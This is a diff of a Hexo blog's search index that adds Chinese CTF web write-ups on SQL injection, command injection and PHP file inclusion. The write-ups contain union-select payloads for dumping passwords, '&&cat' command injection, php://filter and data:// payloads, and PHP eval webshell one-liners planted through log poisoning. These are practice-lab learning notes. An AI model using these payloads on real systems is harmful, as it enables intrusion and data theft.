@@ -102,30 +102,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/p/4a17b156.html</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>入门</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>buu-babysql</title>
     <url>/p/a5cbd811.html</url>
     <content><![CDATA[<h3 id="极客大挑战：-babysql"><a href="#极客大挑战：-babysql" class="headerlink" title="极客大挑战： babysql"></a>极客大挑战： babysql</h3><p>首先这道题目我一开始尝试了万能钥匙 ，但是发现不行，但是可以肯定的是肯定存在注入的</p>
@@ -170,6 +146,77 @@
       </categories>
       <tags>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>lovesql</title>
+    <url>/p/7625e5f3.html</url>
+    <content><![CDATA[<h3 id="极客大挑战：LoveSql"><a href="#极客大挑战：LoveSql" class="headerlink" title="极客大挑战：LoveSql"></a>极客大挑战：LoveSql</h3><p>首先这道题目打开之后就是发现和前面几道差不多</p>
+<p>一开始就是很常规的尝试嘛，首先就是使用一下万能钥匙，发现就是登陆成功了，给了你密码，但是很快就发现没什么用</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDEDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>虽然有md5的值，但是解不了码</p>
+<p>继续尝试，看看有没有绕过什么东西，好像没有，接下来看一下字段看看有多少</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
+
+<p>没有报错，但是当4的时候，报错了，于是可以知道只有三个字段</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>爆破注入点</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3 #这样看也行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>接下来就查看一下用户名和数据库名，其实简单的sql注入的基本流程都差不多，而且查询语句也是差不多的</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select1,database(),user()#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>接着就是爆破库名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>然后就是爆破表名了（这里也可以使用库名去爆破里面的表名）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>接下来就是爆破列名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220723155523482.png" alt="image-20220723155523482"></p>
+<p>很容易看出来肯定是和password有关了，直接爆破列值就好了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(password) from l0ve1ysq1#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>参考文章:<a href="https://blog.csdn.net/weixin_52116519/article/details/124155542">https://blog.csdn.net/weixin_52116519/article/details/124155542</a></p>
+]]></content>
+      <categories>
+        <category>web ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/p/4a17b156.html</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>入门</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
       </tags>
   </entry>
   <entry>
@@ -318,6 +365,144 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界</title>
+    <url>/p/6f63874a.html</url>
+    <content><![CDATA[<h1 id="爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳"><a href="#爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳" class="headerlink" title="爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳"></a>爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳</h1><h1 id="攻防世界🐱‍👓"><a href="#攻防世界🐱‍👓" class="headerlink" title="攻防世界🐱‍👓"></a>攻防世界🐱‍👓</h1><h2 id="MiscOne-this-is-flag"><a href="#MiscOne-this-is-flag" class="headerlink" title="MiscOne:this is flag"></a>MiscOne:this is flag</h2><p>直接在题目中出现了flag，此题教你如何输入答案</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="WebTwo-view-source"><a href="#WebTwo-view-source" class="headerlink" title="WebTwo:view_source"></a>WebTwo:view_source</h2><p>由于右键不可用，而这道题需要查看源代码，有以下几种方法可以查看</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDFCPMNLMMGKMCOHAGOGH" alt="图片.png">查看网页源代码的方式有4种，分别是：</p>
+<p>1、鼠标右击会看到”查看源代码“，这个网页的源代码就出现在你眼前了；</p>
+<p>2、可以使用快捷Ctrl+U来查看源码；</p>
+<p>3、在地址栏前面加上view-source，如view-source</p>
+<p>4、浏览器的设置菜单框中，找到“更多工具”，然后再找开发者工具，也可以查看网页源代码</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="Three：robots"><a href="#Three：robots" class="headerlink" title="Three：robots"></a>Three：robots</h2><p>本题考察的是robots协议，解题过程是先查找robots.txt，根据其中的路径进一步查找</p>
+<p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。我们可以查看robots.txt文件，看看里面有什么内容（源自网络）</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="Four：backup"><a href="#Four：backup" class="headerlink" title="Four：backup"></a>Four：backup</h2><p>常见的备份文件后缀名为.bak</p>
+<p>直接在网站后加上index.php.bak下载其中的文件再打开就可以查看到flag。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="Five-cookie"><a href="#Five-cookie" class="headerlink" title="Five:cookie"></a>Five:cookie</h2><p>Cookie是保存在客户端的纯文本文件。比如txt文件。所谓的客户端就是我们自己的本地电脑。当我们使用自己的电脑通过浏览器进行访问网页的时候，服务器就会生成一个证书并返回给我的浏览器并写入我们的本地电脑。这个证书就是cookie。一般来说cookie都是服务器端写入客户端的纯文本文件。</p>
+<p>本题用brup抓包查看cookie</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>题目提示cookie，那就访问cookie.php试试看，就算没想到这个，也可以试试按F12在“网络”或者“存储”模块看看有没有cookie相关信息，恰巧两个都有cookie.php,试着访问一下，发现让你See the http response（看看http响应头）（出自网站）</p>
+<h2 id="Six：disabled-button"><a href="#Six：disabled-button" class="headerlink" title="Six：disabled_button"></a>Six：disabled_button</h2><p>看到需要修改页面马上想到F12在查看器修改对应的东西，题目提示很明显，找跟disabled想关的东西就行，这个主要涉及到了前端的一些知识，在网页这边就可以修改。然后直接删除这个disable的东西再按一下flag就马上出来了。</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>disabled 属性规定应该禁用 input 元素。被禁用的 input 元素既不可用，也不可点击。可以设置 disabled 属性，直到满足某些其他的条件为止（比如选择了一个复选框等等）。然后，就需要通过 JavaScript 来删除 disabled 值，将 input 元素的值切换为可用。</p>
+<h2 id="Seven：weak-auth"><a href="#Seven：weak-auth" class="headerlink" title="Seven：weak_auth"></a>Seven：weak_auth</h2><p>审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="Eight：weak-auth"><a href="#Eight：weak-auth" class="headerlink" title="Eight：weak auth"></a>Eight：weak auth</h2><p>使用爆破装置，但是爆破过程麻烦。道题是个弱密码题，随便尝试登录，会告诉你用admin来登录</p>
+<p>首先你需要用burt抓包，然后需要一个密码本</p>
+<p>爆破后根据密码长度不同帅选密码。</p>
+<h2 id="Nine-simpe-php"><a href="#Nine-simpe-php" class="headerlink" title="Nine:simpe php"></a>Nine:simpe php</h2><p>这里考察的是简单的代码理解</p>
+<p>通过get方法得到a和b的值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">is_numeric() 函数用于检测变量是否为数字或数字字符串。</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>   我们已经获得一部分flag了，接下来就是整flag2，首先b不能是整数或数字字符串，就是不能都是数字，最后还需要值大于1234，那么我们可以构造个12345a，值大于1234，并且不是纯数字（这里构造方式很多样，你甚至都可以b=12345[]）于是我的payload构造为?a==0&amp;b=12345a。</p>
+<h2 id="Ten-get-post"><a href="#Ten-get-post" class="headerlink" title="Ten:get-post"></a>Ten:get-post</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>直接按照要求一步步进行就可以完成得出flag，直接放入url也可以；</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">了解http请求方法，此处考察get和post两个最常用的请求方法。</span><br><span class="line"></span><br><span class="line">HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：</span><br><span class="line"></span><br><span class="line">GET：向特定的资源发出请求。</span><br><span class="line"></span><br><span class="line">POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</span><br><span class="line"></span><br><span class="line">OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送<span class="string">&#x27;*&#x27;</span>的请求来测试服务器的功能性。</span><br><span class="line"></span><br><span class="line">HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</span><br><span class="line"></span><br><span class="line">PUT：向指定资源位置上传其最新内容。</span><br><span class="line"></span><br><span class="line">DELETE：请求服务器删除Request-URI所标识的资源。</span><br><span class="line"></span><br><span class="line">TRACE：回显服务器收到的请求，主要用于测试或诊断。</span><br><span class="line"></span><br><span class="line">CONNECT：HTTP/<span class="number">1.1</span>协议中预留给能够将连接改为管道方式的代理服务器。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Eleven：xxf-referer"><a href="#Eleven：xxf-referer" class="headerlink" title="Eleven：xxf-referer"></a>Eleven：xxf-referer</h2><p>卷吕</p>
+<p>   xff:是X-Forwarded-For的简写，用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br>    referer:是告诉服务器我是从哪个地方来的</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>首先就是对于ip地址的一个要求，这里我们用bo抓包来修改IP地址，为了方便，我们抓包后发送到repeter来进行。<br>考虑到修改IP地址，所以我们需要在响应头中添加 <code>X-Forwarded-For: 123.123.123.123</code>（常用修改ip地址的方法），这里有一个点需要注意一下，就是这条语句不能放在最下面一行，也不知道是不是我的bp的问题，如果放在最下面就访问总是失败（文章说的）。</p>
+<p>在响应包中看到了这么一句js语句，结合题目要求，所以我们构造referer内容：<code>Referer:https://www.google.com</code></p>
+<h2 id="Twelve：webshell"><a href="#Twelve：webshell" class="headerlink" title="Twelve：webshell"></a>Twelve：webshell</h2><p>此题使用蚁剑，上传一句话木马就好，题目也提醒了，百度了php一句话，并且把它放在index.php</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>打开后直接就能看到flag的文件。</p>
+<p>也可以运用hackbar进行解题</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>源自网络，本人测试不成功。</p>
+<h2 id="Thirteen：command-execution"><a href="#Thirteen：command-execution" class="headerlink" title="Thirteen：command-execution"></a>Thirteen：command-execution</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>本题解题过程就是先尝试一下这个ping 的东西，随便弄个网址，再试一下拼接，接下来就要尝试找flag的相关名字，找到一堆后再找其文件名。</p>
+<p>1.先ping<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>2.拼接一下其他东西，是可以ping通的，那么我们就来尝试命令拼接执行的方法了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>&amp;&amp;ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>3.127.0.0.1 &amp;&amp;find / -name “flag*”命令拼接是可以执行的，同时也确定了这是一台linux服务器，，所以开始我们本次的目标，获得flag，，所以我们全局搜索flag，命令如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp;&amp;find / -name <span class="string">&quot;flag*&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>4.虽然出来很多，但是我们可以明显感觉到flag.txt里就是我们的答案，所以我们cat查看一下。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>&amp;&amp;cat /home/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="Fourteen：simple-js"><a href="#Fourteen：simple-js" class="headerlink" title="Fourteen：simple_js"></a>Fourteen：simple_js</h2><p>此题先需要随便输入一个密码但是发现怎么都是错的，但是题目提醒js，查看源码发现一堆代码，很容易想到要解析代码，这一段代码需要将它转换成10进制，再转换成ascle表</p>
+<p>此题的解码来源于网站<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+]]></content>
+      <categories>
+        <category>web ctf</category>
+      </categories>
+      <tags>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/p/31915a1e.html</url>
+    <content><![CDATA[<h1 id="csdn博客，web教学文件包含"><a href="#csdn博客，web教学文件包含" class="headerlink" title="csdn博客，web教学文件包含"></a>csdn博客，web教学文件包含</h1><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h1 id="ctfshow🙌🤞✌👏👍👌"><a href="#ctfshow🙌🤞✌👏👍👌" class="headerlink" title="ctfshow🙌🤞✌👏👍👌"></a>ctfshow🙌🤞✌👏👍👌</h1><h1 id="文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖"><a href="#文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖" class="headerlink" title="文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖"></a>文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><h3 id="PHP伪协议读取"><a href="#PHP伪协议读取" class="headerlink" title="PHP伪协议读取"></a>PHP伪协议读取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">伪协议相关知识点网站：https://blog.csdn.net/weixin_29466397/article/details/115978566</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h3><p>先用hackbar输入?file=php://filter/convert.base64-encode/resource=flag.php</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDDDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>直接excute得出base64加密，再解密。不能缺少convert，这是转换编码的。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php伪协议，事实上是其支持的协议与封装协议。而其支持的协议有：</span><br><span class="line"></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流(I/O streams)</span></span><br><span class="line"></span><br><span class="line">data:<span class="comment">// — 数据(RFC 2397)</span></span><br><span class="line"></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
+
+<p>一道例题：比如根据题目已经知道flag就在index.php文件里，所以就用PHP://filter读取index.php</p>
+<p>然后进行Base64解码就得到flag</p>
+<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>这是题目，php被？？？替换掉了，因此不能明文读取文件</p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>方法解题：1.题目直接查看源代码，然后输入后，直接可以查看flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><h3 id="文件包含日志上传，一句话木马，运用蚁剑"><a href="#文件包含日志上传，一句话木马，运用蚁剑" class="headerlink" title="文件包含日志上传，一句话木马，运用蚁剑"></a>文件包含日志上传，一句话木马，运用蚁剑</h3><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>题目中date，php都被替换了，不能直接使用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">关键包含日志文件 进行getshell 日志文件路径： ?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>先用hackbar进行excute,再用burpsuit抓包，之后修改user，上传一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>@evaluate（取前四个字母）(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])；<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>之后用蚁剑上传excute后了网站，密码为cmd，打开就可以查看flag；<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><h3 id="绕过die-usr-2"><a href="#绕过die-usr-2" class="headerlink" title="绕过die    usr-2"></a>绕过die    usr-2</h3><p>相关网站：<a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>date，base64都被过滤掉了。引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</span><br><span class="line"> iconv ( string $in_charset , string $out_charset , string $str )：将字符串$str从in_charset编码转换到$out_charset</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php （创建一个a.php）</span></span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?(上传一个<span class="number">1</span>的文件到a.php)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
+<p>再查看源码就能得到flag，根据上面箭头的一步步解题下来。</p>
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>第一种方法如web80</p>
+<p>第二种方法：直接先抓包，再进行修改user，传入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval’tuate‘($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接着传入 ?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>再运行查看源码就ok</p>
+]]></content>
+      <categories>
+        <category>web ctf</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -566,144 +751,6 @@
       </categories>
       <tags>
